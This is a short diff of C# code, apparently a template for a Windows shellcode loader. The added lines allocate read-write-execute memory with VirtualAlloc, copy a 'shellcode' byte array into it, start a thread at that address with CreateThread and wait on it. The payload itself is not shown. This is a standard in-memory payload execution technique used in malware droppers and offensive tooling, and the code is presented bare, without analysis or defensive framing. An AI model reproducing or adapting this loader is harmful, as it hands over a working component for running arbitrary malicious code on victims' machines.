@@ -24,3 +24,12 @@ private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMillis
 private static extern IntPtr CreateThread(UInt32 lpThreadAttributes,  UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
 
 #memory var_static
+
+UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+IntPtr hThread = IntPtr.Zero;
+UInt32 threadId = 0;
+IntPtr pinfo = IntPtr.Zero;
+hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+WaitForSingleObject(hThread, 0xFFFFFFFF);
+return;
